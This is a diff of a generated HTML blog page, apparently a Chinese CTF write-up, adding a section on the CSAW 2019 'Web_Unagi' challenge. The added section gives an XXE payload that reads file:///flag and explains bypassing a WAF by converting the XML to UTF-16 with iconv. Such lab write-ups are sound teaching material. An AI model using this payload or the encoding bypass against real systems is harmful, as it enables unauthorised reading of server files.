@@ -33,8 +33,10 @@
 <meta property="og:image" content="http://yoursite.com/2020/06/02/xxeChallenge/1.png">
 <meta property="og:image" content="http://yoursite.com/2020/06/02/xxeChallenge/2.png">
 <meta property="og:image" content="http://yoursite.com/2020/06/02/xxeChallenge/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/02/xxeChallenge/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/06/02/xxeChallenge/5.png">
 <meta property="article:published_time" content="2020-06-02T14:59:41.000Z">
-<meta property="article:modified_time" content="2020-06-02T15:14:12.188Z">
+<meta property="article:modified_time" content="2020-07-08T02:06:04.807Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary">
@@ -215,10 +217,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-06-02 22:59:41 / Modified: 23:14:12" itemprop="dateCreated datePublished" datetime="2020-06-02T22:59:41+08:00">2020-06-02</time>
+              <time title="Created: 2020-06-02 22:59:41" itemprop="dateCreated datePublished" datetime="2020-06-02T22:59:41+08:00">2020-06-02</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-07-08 10:06:04" itemprop="dateModified" datetime="2020-07-08T10:06:04+08:00">2020-07-08</time>
+              </span>
 
           
 
@@ -243,7 +251,23 @@
 <img src="/2020/06/02/xxeChallenge/3.png" class="" title="examplename">
 
 <p>可以看到读到了flag，这里内网主机可以用burp爆破，脚本暂时没找到</p>
+<h3 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h3><p>文件上传，在about处得知flag在根目录下，在upload处有个提示，是xml的格式</p>
+<img src="/2020/06/02/xxeChallenge/4.png" class="" title="examplename">
 
+<p>看到这个，应该就是上传一个xml 的文件来打了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span>  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>写一个文件，users字段直接用网页给的信息就行，直接上传，发现过不了，有WAF，找到了一篇xxe绕WAF的文章<a href="https://xz.aliyun.com/t/4059#toc-4，里面提到可以用编码进行绕过" target="_blank" rel="noopener">https://xz.aliyun.com/t/4059#toc-4，里面提到可以用编码进行绕过</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</span><br><span class="line">在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</span><br></pre></td></tr></table></figure>
+
+<p>查一下linux的编码转换命令(GBK-&gt;UTF-8）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f GBK -t UTF-8 file1 -o file2</span><br></pre></td></tr></table></figure>
+
+<p>改一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16 file1&gt;file2</span><br></pre></td></tr></table></figure>
+
+<p>将转换完的文件上传</p>
+<img src="/2020/06/02/xxeChallenge/5.png" class="" title="examplename">
     </div>
 
     
@@ -401,7 +425,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#NCTF2019-True-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">[NCTF2019]True XML cookbook</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#NCTF2019-True-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">[NCTF2019]True XML cookbook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSAWQual-2019-Web-Unagi"><span class="nav-number">2.</span> <span class="nav-text">[CSAWQual 2019]Web_Unagi</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -417,14 +441,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">38</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
